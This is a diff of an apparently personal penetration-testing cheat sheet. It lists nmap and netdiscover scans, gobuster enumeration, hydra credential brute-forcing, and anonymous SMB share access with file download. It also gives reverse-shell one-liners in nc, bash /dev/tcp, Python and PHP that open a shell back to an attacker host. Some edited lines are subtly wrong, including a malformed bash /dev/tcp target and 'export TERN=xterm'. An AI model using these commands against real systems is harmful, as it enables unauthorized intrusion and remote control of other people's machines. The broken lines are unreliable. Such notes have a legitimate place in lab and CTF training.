@@ -4,12 +4,12 @@
 ########################################
 
 # Quick network discovery (Ethernet only)
-netdiscover -i eth0 -r 10.0.0.1/24
+netdiscover -i eth0 -r 10.0.0.1/24 # never gonna need it i guess
 
 # If netdiscover doesn't work (VPN/tunnel), fall back to ping sweep
-ifconfig
-route
-nmap 10.0.0.1/24 -sn -T5 -v
+ifconfig # or ip a
+route # sure
+nmap 10.0.0.1/24 -sn -T5 -v #for real quick scan of all network
 
 ########################################
 # Install Rustscan (manual)
@@ -26,7 +26,7 @@ dpkg -i rustscan*.deb
 nmap $target -sS -T4 -A -p- -v
 
 # Fast aggressive scan
-nmap $target -Pn -p- --min-rate 2000 -sC -sV -v
+nmap $target -Pn -p- --min-rate 2000 -sV -v #-sC for default scripts on ALL ports, not a good idea
 
 # UDP quick top ports
 nmap $target -Pn -sU -sV -T3 --top-ports 25 -v
@@ -89,6 +89,16 @@ gobuster vhost -u http://example.lab/ -w /usr/share/seclists/Discovery/DNS/subdo
 # - Check cookies/session tokens
 # - Intercept → Modify → Replay requests
 
+
+##### windows stuff ##########
+
+#for smb, use
+smbclient -L $target # to check for anonymous listing of shares, or -U for defining a user, like anonymous even
+
+#then, to connect to the share, do:
+smbclient //$target/sharename -U " "%" " #and then, "get" any file you want!
+
+
 ########################################
 # 4. CREDENTIAL ATTACKS (LAB ONLY)
 ########################################
@@ -103,12 +113,12 @@ hydra -l admin -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt \
 # Listener
 nc -nvlp 5555
 
-# Common one-liners:
+# Common one-liners: - check revshells.com for making the best ones!
 # nc (if -e supported)
 # nc -e /bin/sh <LHOST> <LPORT>
 
 # Bash
-# bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
+# bash -i >& /dev/tcp/10.10.XX.XXX:5555 0>&1
 
 # Python
 # python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
@@ -117,7 +127,12 @@ nc -nvlp 5555
 # php -r '$s=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 # Spawn stable PTY
-python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+#also what else?
+export TERN=xterm
+
+#and something more i am sure?
 
 ########################################
 # 6. FILE TRANSFER
